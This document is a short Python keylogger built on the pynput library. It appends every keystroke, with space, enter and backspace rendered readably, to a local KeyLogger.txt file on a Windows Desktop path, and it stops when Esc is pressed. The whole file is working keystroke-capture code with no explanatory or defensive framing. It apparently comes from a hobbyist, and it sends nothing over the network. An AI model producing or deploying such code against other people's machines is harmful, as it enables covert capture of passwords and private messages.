from pynput.keyboard import Key, Listener

log_file = r"C:\Users\abroh\OneDrive\Desktop\KeyLogger.txt"


def write_to_log(key):
    key = str(key)
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    with open(log_file, "a") as f:
        f.write(key)


def on_press(key):
    write_to_log(key)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
